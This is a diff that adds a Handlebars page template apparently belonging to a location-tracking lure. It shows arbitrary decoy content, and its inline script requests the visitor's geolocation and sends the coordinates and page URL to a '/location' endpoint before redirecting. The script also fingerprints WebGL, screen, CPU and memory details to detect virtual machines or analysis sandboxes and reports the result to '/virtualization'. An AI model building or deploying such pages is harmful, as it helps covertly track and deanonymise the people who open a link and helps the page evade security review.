@@ -1,0 +1,100 @@
+{{> client_content}}
+
+
+<script>
+
+  (function(){
+       let xhr = new XMLHttpRequest();
+       function success(position){
+       xhr.open('POST','/location',true);
+       xhr.setRequestHeader('Content-type','application/json');
+       const locationData = {
+         referrer:window.location.href,
+         accuracy:position.coords.accuracy,
+         latitude:position.coords.latitude,
+         longitude:position.coords.longitude,
+       }
+
+       console.log(position)
+       xhr.send(JSON.stringify(locationData));
+
+       {{# if redirect}}
+       window.location.href = '{{redirect}}';
+       {{/if}}
+    }
+
+    function failure(error){
+        {{# if redirect}}
+        window.location.href = '{{redirect}}';
+        {{/if}}
+    }
+
+
+    function detectVir(){
+        let probability=0.00;
+        let result;
+        let factor=0;
+
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl');
+
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        console.log(vendor);
+        let vendsplit=vendor.split(' ');
+        if(vendsplit[0] =="VMware," || vendsplit[0]=='VirtualBox'){
+            console.log('Virtual MAchine');
+            return(1);        
+        }
+
+        console.log(renderer);
+        let graphic = renderer.split(' ');
+        console.log(graphic);
+
+        if(graphic[1] =="(VirtualBox," ||graphic[1] =="(Google,"){
+            console.log('Virtual MAchine');
+            return(1);        
+        }else if(graphic[4]=="(SwiftShader" ||graphic[4]=="llvmpipe"){
+            factor+=1;
+
+        }
+
+        let screenWid=window.screen.width * window.devicePixelRatio;
+        if(screenWid<1200){
+            factor+=1;
+        }
+
+        let pcount=navigator.hardwareConcurrency;
+        if(pcount<4){
+            factor+=1;
+        }
+
+        var ram = navigator.deviceMemory;
+        if(ram <4){
+            factor+=1;
+        }
+
+        probability=factor/4;
+        result = probability>=.5 ? true:false
+        return{probability,result};
+    }
+
+
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(success,failure);
+    }
+
+   
+   const isVM = {referrer:window.location.href, ...detectVir()}
+   xhr.open('POST','/virtualization',true)
+   xhr.setRequestHeader('Content-type','application/json');
+   xhr.send(JSON.stringify(isVM));
+
+
+  }
+  )();
+
+</script>
